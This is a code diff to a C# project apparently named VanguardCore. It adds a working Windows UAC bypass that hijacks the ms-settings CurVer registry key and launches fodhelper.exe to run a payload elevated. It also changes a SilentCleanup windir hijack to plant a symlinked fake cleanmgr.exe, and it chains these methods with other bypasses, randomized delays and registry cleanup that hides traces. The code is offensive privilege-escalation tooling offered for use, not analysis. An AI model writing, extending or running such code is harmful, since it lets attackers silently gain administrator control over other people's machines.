@@ -55,6 +55,9 @@ namespace VanguardCore
             [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
             public static extern bool CreateDirectoryW(string lpPathName, IntPtr lpSecurityAttributes);
 
+            [DllImport("kernel32.dll", EntryPoint = "CreateSymbolicLinkW", SetLastError = true, CharSet = CharSet.Unicode)]
+            public static extern bool CreateSymbolicLinkW(string lpSymlinkFileName, string lpTargetFileName, int dwFlags);
+
             [DllImport("user32.dll")]
             public static extern IntPtr GetForegroundWindow();
 
@@ -189,6 +192,28 @@ namespace VanguardCore
             } catch { return false; }
         }
 
+        private static bool BypassCurVer(string payloadPath, string args, string evName, string trigger = "fodhelper.exe")
+        {
+            string randKey = Guid.NewGuid().ToString("N").Substring(0, 8);
+            string classKey = $@"Software\Classes\{randKey}";
+            try {
+                Log($"Method R: CurVer Hijack ({randKey})...");
+                using (var k = Registry.CurrentUser.CreateSubKey($@"{classKey}\shell\open\command")) {
+                    k.SetValue("", $"\"{payloadPath}\" {args}");
+                    k.SetValue("DelegateExecute", "");
+                }
+                using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\CurVer")) {
+                    k.SetValue("", randKey);
+                }
+                Process.Start(new ProcessStartInfo { FileName = trigger, UseShellExecute = true, CreateNoWindow = true });
+                return WaitForAdminSuccess(10000, evName);
+            } catch { return false; }
+            finally {
+                try { Registry.CurrentUser.DeleteSubKeyTree(classKey, false); } catch { }
+                try { Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings", true)?.DeleteSubKey("CurVer", false); } catch { }
+            }
+        }
+
         private static unsafe bool BypassColorDataProxy(string payloadPath, string args, string evName)
         {
             try {
@@ -253,11 +278,17 @@ namespace VanguardCore
         private static bool BypassSilentCleanup(string payloadPath, string args, string evName)
         {
             try {
-                Log("Method H: SilentCleanup Hijack...");
+                Log("Method H: SilentCleanup Hijack (Symlink)...");
                 string fakeWindir = Path.Combine(Path.GetTempPath(), $"WinUpdate_{Guid.NewGuid():N}.tmp");
                 string sys32 = Path.Combine(fakeWindir, "system32");
                 Directory.CreateDirectory(sys32);
-                File.Copy(payloadPath, Path.Combine(sys32, "cleanmgr.exe"));
+                
+                // Red Team Hardcore: Use Symbolic Link instead of file copy
+                if (!Native.CreateSymbolicLinkW(Path.Combine(sys32, "cleanmgr.exe"), payloadPath, 0)) {
+                    // Fallback to copy if symlink fails
+                    File.Copy(payloadPath, Path.Combine(sys32, "cleanmgr.exe"));
+                }
+                
                 Registry.CurrentUser.OpenSubKey("Volatile Environment", true).SetValue("windir", fakeWindir);
                 Process.Start(new ProcessStartInfo { FileName = "schtasks.exe", Arguments = "/Run /TN \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I", CreateNoWindow = true });
                 bool ok = WaitForAdminSuccess(15000, evName);
@@ -338,6 +369,7 @@ namespace VanguardCore
             if (BypassCmluaUtil(payloadPath, args, evName)) return true;
             if (BypassFwCplLua(payloadPath, args)) return true;
             if (BypassMockDir(payloadPath, args, evName)) return true;
+            if (BypassCurVer(payloadPath, args, evName)) return true; // Added professional CurVer bypass
             if (BypassColorDataProxy(payloadPath, args, evName)) return true;
             
             Thread.Sleep(new Random().Next(3000, 6000));
